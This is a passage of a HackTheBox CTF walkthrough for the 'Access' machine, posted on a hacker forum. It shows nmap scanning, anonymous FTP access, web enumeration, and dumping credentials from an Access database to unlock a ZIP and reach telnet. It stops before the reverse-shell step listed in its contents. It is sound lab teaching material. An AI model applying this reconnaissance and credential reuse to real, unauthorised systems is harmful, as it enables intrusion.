<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>[HTB] SHELL AFFECT - Access - WriteUp - Hackthebox Writeups - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Hey buddies! 
How are you doing? 
This time I will show you how to root the ‚ÄòAccess‚Äô VM from HackTheBox. 
Like other topics, I will focus on the methodology and the steps which were required to root the box on your own&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="13085.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;[HTB] SHELL AFFECT - Access - WriteUp&#39;" href="13085.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/9/90946da6acbedac2668b6f64d716d8bac331d5e9.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/9/90946da6acbedac2668b6f64d716d8bac331d5e9.png" />
<meta property="og:url" content="https://0x00sec.org/t/htb-shell-affect-access-writeup/13085" />
<meta name="twitter:url" content="https://0x00sec.org/t/htb-shell-affect-access-writeup/13085" />
<meta property="og:title" content="[HTB] SHELL AFFECT - Access - WriteUp" />
<meta name="twitter:title" content="[HTB] SHELL AFFECT - Access - WriteUp" />
<meta property="og:description" content="Hey buddies!  How are you doing?  This time I will show you how to root the ‚ÄòAccess‚Äô VM from HackTheBox.  Like other topics, I will focus on the methodology and the steps which were required to root the box on your own successfully.  Table of contents 1. Port scanning 2. Port filtering 3. Service enumeration 4. FTP 5. Telnet 6. HTTP 7. Analyse Microsoft Access Database 8. ZIP File extraction 9. Telnet Login 10. Reverse Shell through PowerShell 11. Local enumeration 12. Privilege Escalation 13...." />
<meta name="twitter:description" content="Hey buddies!  How are you doing?  This time I will show you how to root the ‚ÄòAccess‚Äô VM from HackTheBox.  Like other topics, I will focus on the methodology and the steps which were required to root the box on your own successfully.  Table of contents 1. Port scanning 2. Port filtering 3. Service enumeration 4. FTP 5. Telnet 6. HTTP 7. Analyse Microsoft Access Database 8. ZIP File extraction 9. Telnet Login 10. Reverse Shell through PowerShell 11. Local enumeration 12. Privilege Escalation 13...." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta property="og:article:section" content="Hackthebox Writeups" />
<meta property="og:article:section:color" content="3AB54A" />
<meta property="og:article:tag" content="tutorial" />
<meta property="og:article:tag" content="ctf" />
<meta property="og:article:tag" content="pentesting" />
<meta property="og:article:tag" content="hacking" />
<meta property="og:article:tag" content="networking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="5 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="3 ‚ù§" />
<meta property="article:published_time" content="2019-04-18T13:09:08+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="13085.html">[HTB] SHELL AFFECT - Access - WriteUp</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F1592A"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">CTF</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/ctf/htb-writeups/103.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #3AB54A"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Hackthebox Writeups</span>
</span>
</a>
<meta itemprop="position" content="2" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/tutorial.html" class="discourse-tag" rel="tag">tutorial</a>,
<a href="../../tag/ctf.html" class="discourse-tag" rel="tag">ctf</a>,
<a href="../../tag/pentesting.html" class="discourse-tag" rel="tag">pentesting</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>,
<a href="../../tag/networking.html" class="discourse-tag" rel="tag">networking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="[HTB] SHELL AFFECT - Access - WriteUp">
<meta itemprop="articleSection" content="Hackthebox Writeups">
<meta itemprop="keywords" content="tutorial, ctf, pentesting, hacking, networking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Cry0l1t3"><span itemprop="name">Cry0l1t3</span></a>
</span>
<link itemprop="mainEntityOfPage" href="13085.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/9/90946da6acbedac2668b6f64d716d8bac331d5e9.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-04-18T13:09:08Z" class="post-time">
April 18, 2019, 1:09pm
</time>
<meta itemprop="dateModified" content="2019-04-18T13:29:17Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/90946da6acbedac2668b6f64d716d8bac331d5e9.png" alt="0x00sec-Access" data-base62-sha1="kD0LeZbyugt2GPuTsYWbBBZVt1f" width="690" height="225"></p>
<p>Hey buddies!<br>
How are you doing?</p>
<p>This time I will show you how to root the ‚ÄòAccess‚Äô VM from <a href="https://hackthebox.eu" rel="noopener nofollow ugc">HackTheBox</a>.<br>
Like other topics, I will focus on the methodology and the steps which were required to root the box on your own successfully.</p>
<h1>Table of contents</h1>
<pre><code class="lang-auto">1. Port scanning
2. Port filtering
3. Service enumeration
4. FTP
5. Telnet
6. HTTP
7. Analyse Microsoft Access Database
8. ZIP File extraction
9. Telnet Login
10. Reverse Shell through PowerShell
11. Local enumeration
12. Privilege Escalation
13. Challenge
</code></pre>
<p>Let‚Äôs begin.</p>
<h2>1. Ping &amp; Port Scanning</h2>
<p>As always, I like to start to scan the machine just for open ports. We need an overview of our target. Because we don‚Äôt know how our target was configured, we should do small steps. So let us ping the machine.</p>
<blockquote>
<p>ping -c 3 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a41d6bb8fc06ceb3d5b6da4088d6765a818ae044.png" alt="grafik" data-base62-sha1="npPl0LnGiUMVz3ygWn2CRTOb8B6" width="546" height="189"></p>
<p>Notice the TTL (Time-To-Live) is 127. But what is TTL?<br>
Do some research and try to find out on your own.<br>
<strong>You should practice it!</strong></p>
<p>When you find the information you need, then you can go forward.<br>
<em>But what do we need to know?</em></p>
<p>This is a great question and to become better, and it‚Äôs necessary to be able to find the solution on your own. So take a step back and create an overview for yourself. Also, you should ask yourself:<br>
<strong>What do I need?</strong><br>
<strong>What is my goal (for this part!)?</strong></p>
<p>It‚Äôs always easy if you see the solution. Every machine looks pretty easy if you know how to root it. <strong>The most difficult part of it is to find a way into it on your own.</strong><br>
So do some research before you continue.</p>
<hr>
<p>Some useful resources you should find are:</p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://searchnetworking.techtarget.com/favicon.ico" class="site-icon" width="256" height="256">
<a href="https://searchnetworking.techtarget.com/definition/time-to-live" target="_blank" rel="noopener nofollow ugc">SearchNetworking</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e0f0e077d158921e77e8956b2ae5519fc3680e4a.png" class="thumbnail" width height>
<h3><a href="https://searchnetworking.techtarget.com/definition/time-to-live" target="_blank" rel="noopener nofollow ugc">What is time-to-live (TTL)? - Definition from WhatIs.com</a></h3>
<p>Time-to-live (TTL) is a value in an Internet Protocol (IP) packet that limits the lifespan of a packet of data in a computer or network.</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://www.netresec.com/favicon.ico" class="site-icon" width="128" height="128">
<a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank" rel="noopener nofollow ugc">Netresec</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/8/82b545cb3027513a42f107454b8c5365eb8b409c.jpeg" class="thumbnail" width height>
<h3><a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank" rel="noopener nofollow ugc">Passive OS Fingerprinting - NETRESEC Blog</a></h3>
<p>Network traffic from a computer can be analyzed to detect what operating system it is running. This is to a large extent due to differences in how the TCP/IP stack is implemented in various operating systems. We will in this blog post explain the...</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<aside class="onebox stackexchange">
<header class="source">
<a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">superuser.com</a>
</header>
<article class="onebox-body">
<a href="https://superuser.com/users/238360/ary" target="_blank" rel="noopener nofollow ugc">
<img alt="Ary" src="https://0x00sec.s3.amazonaws.com/original/2X/e/e5c34b7de1c34f86a329c19b82e5307f4fee0450.png" class="thumbnail onebox-avatar" width height>
</a>
<h4>
<a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">How to identify which OS is running at remote host?</a>
</h4>
<div class="tags">
<strong>linux, windows</strong>
</div>
<div class="date">
answered by
<a href="https://superuser.com/users/238360/ary" target="_blank" rel="noopener nofollow ugc">
Ary
</a>
on <a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">05:45PM - 16 Jul 13 UTC</a>
</div>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p>Now we know that the OS is most likely a Windows.</p>
<p>Let us enumerate the open ports of this machine by using Nmap.<br>
If you‚Äôre not familiar with Nmap, you should do some research. It is an essential tool which the most Penetration Testers are using.</p>
<p>Resource: <a href="https://nmap.org/" rel="noopener nofollow ugc">https://nmap.org/</a></p>
<blockquote>
<p>nmap 10.10.10.98 -Pn -n -p- --open -oN allports.nmap --stats-every 30s --max-retries 2 -T5</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dab9cc34a75a76bbc9f9d8e18e3b58daf35ce9d4.png" alt="grafik" data-base62-sha1="vcW9OiWsbgOVAtJXSeU40t59HrS" width="690" height="177"></p>
<p>Alright, what do we have so far?</p>
<ul>
<li>OS: Windows (most likely)</li>
<li>FTP</li>
<li>Telnet</li>
<li>HTTP</li>
</ul>
<h2>2. Port filtering</h2>
<p>It‚Äôs possible that you will discover much more open ports on other machines and it could be a pain to type them manually.<br>
Let us filter these by using Bash.</p>
<blockquote>
<p>cat allports.nmap | grep tcp | cut -d"/" -f1 | tr ‚Äú\n‚Äù ‚Äú,‚Äù | sed ‚Äòs/.$//g‚Äô</p>
</blockquote>
<p>If you don‚Äôt understand the command, you can visit this site to get a better understanding of it: <a href="https://explainshell.com/" rel="noopener nofollow ugc">https://explainshell.com/</a></p>
<p>Now we can save the output of it in a variable.</p>
<blockquote>
<p>PORTS=$(cat allports.nmap | grep tcp | cut -d"/" -f1 | tr ‚Äú\n‚Äù ‚Äú,‚Äù | sed ‚Äòs/.$//g‚Äô)</p>
</blockquote>
<p>To verify it looks great, we should ‚Äòecho‚Äô it.</p>
<blockquote>
<p>echo $PORTS</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8bb6d7ded72f512dbcb4d2e9fe7c36c88d5f0b3b.png" alt="grafik" data-base62-sha1="jVY6I3GpQqNP8hmBzKLdZmvMXwv" width="689" height="33"></p>
<p>And now we can proceed.</p>
<h2>3. Service enumeration</h2>
<p>Service enumeration is the part where we try to find out more information about the running services. Enumeration doesn‚Äôt mean only to collect as much information as possible moreover you have to create an overview based on all the information you had received.</p>
<p>Let us use Nmap for service scan and the Nmap Scripting Engine (NSE) to collect more information about the running services.</p>
<blockquote>
<p>nmap 10.10.10.98 -p$PORTS -sV -sC -oN services.nmap --stats-every 30s --max-retries 2</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8b730b25584fd9585403de71b487c73e9b935332.png" alt="grafik" data-base62-sha1="jTCQzQZ1Y9dO6tjiXHsdWsPTFrc" width="690" height="60"></p>
<p>So here is how our results look like:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc38db5d7423233d23447bbf430d6db6fa22a023.png" alt="grafik" data-base62-sha1="t8DdB0WFIcBEG7sfgdGqBckNC0j" width="517" height="180"></p>
<p>Look at the information we‚Äôve got so far closely.<br>
Every information in this result is crucial for us.<br>
<strong>You should append the info we just found out to our previous overview.</strong></p>
<p>You also should notice the Telnet line. Take a closer look at it. What exactly do you see there?</p>
<p>There is a question mark. Right. What could this mean?<br>
<strong>[Important] Train your research skills and try to find it out on your own.</strong></p>
<p>Sometimes it can be essential to search for information like this little thing.</p>
<h2>4. FTP</h2>
<p>Let us take a look at the FTP server. You should notice from the previous Nmap scan that we have ‚ÄòAnonymous login allowed‚Äô. So let‚Äôs use it.</p>
<blockquote>
<p>ftp 10.10.10.98</p>
</blockquote>
<p><strong>Credentials:</strong><br>
Name: <em>anonymous</em><br>
Password: <em>anon</em></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a12a6ea8b6f29829576e12119753a0bc065c9309.png" alt="grafik" data-base62-sha1="mZJMzyFhXGlZyBrYZudy9lK8JS1" width="635" height="275"></p>
<p>By looking into these directories, we found some interesting files.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a7af24c49e0e93f27d3725a847a567c764a20095.png" alt="grafik" data-base62-sha1="nVoYP9Z0W075yIoIKMU8eli772R" width="530" height="282"></p>
<p>Now we have to download it. I will show you two different methods you can do it.<br>
We can use FTP with the ‚Äò<strong>get</strong>‚Äô command, or we use ‚Äò<strong>wget</strong>‚Äô to download these files.<br>
But first, we have to still organised. So we create an FTP directory where we will store the files.</p>
<h3>GET command</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4a2d6b7179fdd8665c1664ea1768661359947f98.png" alt="grafik" data-base62-sha1="aAcDVOrZZZ5XCAElMlL93iRm8MU" width="482" height="350"></p>
<h3>WGET</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c83b4f4cbd167d4c09105f3c545883a98bc81fa.png" alt="grafik" data-base62-sha1="1MHUra6RuhCWuf8txau4ne9Y4Km" width="690" height="42"></p>
<p>You should read the manual of ‚Äò<strong>wget</strong>‚Äô to understand the command and find out what <strong>PASV</strong> mode of an FTP server is.</p>
<p>Before we begin to analyse the files let us enumerate the other services too.</p>
<h2>5. Telnet</h2>
<p>Did you find out what the question mark means?<br>
Now we will take a look at this service by using <strong>telnet</strong>.</p>
<blockquote>
<p>telnet 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/deaf9a6bf9b72867fead252950e576cbd813a655.png" alt="grafik" data-base62-sha1="vLYe2YRFzJKYq00tUyK6ogj1Mqx" width="574" height="131"></p>
<p>You will notice that it will take a few seconds before the login prompt appears.<br>
That is the reason for the question mark at the Nmap scan. Nmap couldn‚Äôt determine this service as Telnet because the response took to long. But because Telnet is basically on TCP port 23 it gave us the output of <em>maybe</em> it‚Äôs Telnet.</p>
<p>We don‚Äôt have any credentials to log in yet and to start bruteforcing this service just doesn‚Äôt make sense without any information of the ‚Äòorganisation‚Äô or the machine we are trying to root. If we shouldn‚Äôt find any useful information than we can try to bruteforce it, but now let us take a look at the Web server.</p>
<h2>6. HTTP</h2>
<p>First, we should just interact with the Web server. Let us visit it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3aca6e232f45dea5e79df2d7545269ca9422a2d1.jpeg" alt="grafik" data-base62-sha1="8o5oG4rBdI1GW3ga93oLVRjAQwh" width="510" height="375"></p>
<p>Here we can download the image for later analysis.<br>
Also, we want to know how the header looks like. Which ‚Äò<strong>OPTIONS</strong>‚Äô are allowed?.<br>
The questions you should ask yourself:</p>
<ul>
<li>Are there some security headers?</li>
<li>What kind of security headers exists?</li>
</ul>
<p>Again, train your research skills and learn new things. Use all search engines and methods you know to find out the information you don‚Äôt know.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e82aabeff8dda42d561c90e52216022141c448d.png" alt="grafik" data-base62-sha1="bcxc77Ki1E62gRfiDHbpSxlvGrz" width="690" height="321"></p>
<p>From this point, we want to spider the Web server to find out which directories on it exist.<br>
Therefore we will use <strong><a href="https://portswigger.net/burp" rel="noopener nofollow ugc">Burp Suite</a></strong>.<br>
After setting up our Proxy-Settings and configure our target in Burp we can send another GET request to the Web server and intercept it. By sending it to spider in Burp, it will hopefully find some useful files or directories.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3c86210f17cb519c4b1a962ea4fb3fdd246da704.jpeg" alt="grafik" data-base62-sha1="8Dq19pl1HpT1Ei68rVvDwuT4CdS" width="690" height="211"></p>
<p>By clicking on <strong>Action</strong> you can send the request to Spider in Burp.<br>
Burp Spider is a crawler which will be used to map a Web server (<a href="https://www.hackingarticles.in/spider-web-applications-using-burpsuite/" rel="noopener nofollow ugc">learn more</a>).</p>
<p>Now our results look like we don‚Äôt have much here:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/31e22f2d5e3b9e01f3f700b8d986193220026345.png" alt="grafik" data-base62-sha1="77hZBAzYbU7s2GLRgbMIfsIMytT" width="517" height="191"></p>
<p>From here we can make another step and bruteforce the Web server with <strong>GET</strong> requests for different files and directories. There exist a lot of tools out there like <strong>gobuster</strong>, <strong>dirbuster</strong>, <strong>dirb</strong> and <strong>dirsearch</strong>.<br>
At this example, I will use <strong>dirsearch</strong>. It isn‚Äôt installed in Kali Linux by default.<br>
So <a href="https://github.com/maurosoria/dirsearch" rel="noopener nofollow ugc">here</a> is the resource for dirsearch where you can download it.</p>
<p>You can download it by using the following command:</p>
<blockquote>
<p>git clone <a href="https://github.com/maurosoria/dirsearch.git" rel="noopener nofollow ugc">https://github.com/maurosoria/dirsearch.git</a> /opt/dirsearch/</p>
</blockquote>
<p>Also, to make it globally executable you can create a symbolic link to <code>/usr/local/bin/</code> .</p>
<blockquote>
<p>ln -s /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch</p>
</blockquote>
<p>By typing:</p>
<blockquote>
<p>dirsearch -h</p>
</blockquote>
<p>you will see all the options it has. Now let us enumerate the Web server with it.</p>
<blockquote>
<p>dirsearch -u <a href="http://10.10.10.98" rel="noopener nofollow ugc">http://10.10.10.98</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 --max-retries=2 -e html,jpg,png,xml,aspx,asp,htm,asmx,dll,db</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/371b64a94d6063f9a9e199832c4ee41d8b5b2005.png" alt="grafik" data-base62-sha1="7RuWVVn9LOCTrCSRoC1vfT5A1uJ" width="690" height="143"></p>
<p>Unfortunately, nothing is interesting in the Web server. Another tool we can use is <strong>nikto</strong>.<br>
This will provide us with a lot of information:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/99252aed170009ac618550eaa08006cebded110d.png" alt="grafik" data-base62-sha1="lQMGqHEbH96tcOJosyohsW5Hr1H" width="690" height="376"><br>
<strong>You should always note all of the information we collected so far during the process.</strong></p>
<p>Let‚Äôs move on.</p>
<h2>7. Microsoft Access Database</h2>
<p>At this point, we should determine the file types of the files we are working with.<br>
This could be done with a tool called ‚Äò<strong>file</strong>‚Äô.</p>
<blockquote>
<p>file Access\ Control.zip<br>
file backup.mdb</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/acec852dc5fddf438790aef5d74de6e50687834a.png" alt="grafik" data-base62-sha1="oFKRLpr9PwnqotSr2esdD9ObYim" width="653" height="74"></p>
<p>Another method to find more information we can use ‚Äò<strong>exiftool</strong>‚Äô.</p>
<h3>Access Control.zip</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/89216dcaefe5ecc0e811ca9549f2e1f447988c95.png" alt="grafik" data-base62-sha1="jz728AoAxc1ymVIJBblTuPkpNjv" width="688" height="359"></p>
<h3>backup.mdb</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/757bdaf67555e974b68d39bea114ce3831825b8a.png" alt="grafik" data-base62-sha1="gLjdOD3tIy5ZYkQMr81QhbIKP2i" width="615" height="180"></p>
<p>Notice that ‚Äò<strong>exiftool</strong>‚Äô couldn‚Äôt determine the file type. So we have to do it manually.</p>
<blockquote>
<p>Ok Google: mdb file</p>
</blockquote>
<p>On the first result page, you will be able to find this URL: <a href="https://fileinfo.com/extension/mdb" rel="noopener nofollow ugc">https://fileinfo.com/extension/mdb</a><br>
It provides us with the information we need.</p>
<p><strong>I can‚Äôt repeat it often enough: note it!</strong></p>
<p>Another question:</p>
<blockquote>
<p>Ok, Google: extract mdb data kali</p>
</blockquote>
<p>Here you will find a website called <a href="http://mdbtools.sourceforge.net/install/x53.htm" rel="noopener nofollow ugc">http://mdbtools.sourceforge.net/install/x53.htm</a>.</p>
<p>By using ‚Äò<strong>mdbtools</strong>‚Äô we can work with this file. Let us take a look at how it does look inside.</p>
<blockquote>
<p>mdb-tables backup.mdb</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9fb6eb8a0874f431dab07877332299c6138fb511.png" alt="grafik" data-base62-sha1="mMTOYKhPPnyKMgZGr8HHZrohRN7" width="488" height="108"></p>
<p>Ok. We have to structure it to make it easily readable.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/0/03e23915903e9e2efee92fa60596044ebcb049bd.png" alt="grafik" data-base62-sha1="ym704ti82tGun3kB9YpJbNoXFP" width="517" height="198"></p>
<p>We see the <code>auth_user</code> table inside. Let‚Äôs export the data from this table.</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr ‚Äú,‚Äù " " | grep ‚Äú\‚Äù" | cut -d" " -f2-3 | sed ‚Äòs/\"//g‚Äô | tr " " ‚Äú:‚Äù</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2a08120a9bc87b0a90d41058e00676b09b948e00.png" alt="grafik" data-base62-sha1="5ZPlmUCwM4wn5m2cq2Ts8nMqREI" width="690" height="151"></p>
<p>Also, we should save this information.</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr ‚Äú,‚Äù " " | grep ‚Äú\‚Äù" | cut -d" " -f2-3 | sed ‚Äòs/\"//g‚Äô | tr " " ‚Äú:‚Äù &gt; creds.txt</p>
</blockquote>
<p>Another way we can use is the following:</p>
<blockquote>
<p>mdb-export backup.mdb auth_user | tr ‚Äú,‚Äù " " | column -t</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3e888fa5f6b585e2e584e2b044fb480d3b320438.png" alt="grafik" data-base62-sha1="8VcbppNJHWHdNDlqWLGWw9AHg0M" width="690" height="66"></p>
<h2>8. ZIP File extraction</h2>
<p>Next file is our ZIP archive. We want to know what‚Äôs inside of it.</p>
<blockquote>
<p>unzip Access\ Control.zip</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6461456bb33f569873b7e2e0bfaa366258bcd040.png" alt="grafik" data-base62-sha1="ek09gY0j45Ksyy83bOdYCQIHKBG" width="668" height="56"></p>
<p><strong>Do some research. Find out why this error appears.</strong></p>
<blockquote>
<p>7z -e Access\ Control.zip</p>
</blockquote>
<p>Now it‚Äôs asking us for a password. Did we find some credentials already?<br>
Let us try to use them:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/34a39516d60a1db5406965b70744746931f907b3.png" alt="grafik" data-base62-sha1="7vFiJfOvPXrHxua4nXPkzO9HPxN" width="473" height="270"></p>
<p>We extracted a file called ‚Äò<strong>Access Control.pst</strong>‚Äô. What kind of file is it?</p>
<blockquote>
<p>file Access\ Control.pst</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/704865563e8405fd842dda0311c41584f4ca910d.png" alt="grafik" data-base62-sha1="g1iAdc3tqeNWLb7gC0MM6KY3QfP" width="659" height="147"></p>
<p>Find out a way on your own to read the content.</p>
<blockquote>
<p>cat ‚Äò<strong>Access Control.mbox</strong>‚Äô | head -n 25</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0670dcd65b08f86a0ad4ce2b95d1f65cfac39c98.png" alt="grafik" data-base62-sha1="UYFESOjrP65VDNDe8AVdUmMOG4" width="690" height="264"></p>
<h2>9. Telnet Login</h2>
<p>At this point, we found other credentials which we can use.<br>
Let us try to log in by using these.</p>
<blockquote>
<p>telnet 10.10.10.98</p>
</blockquote>
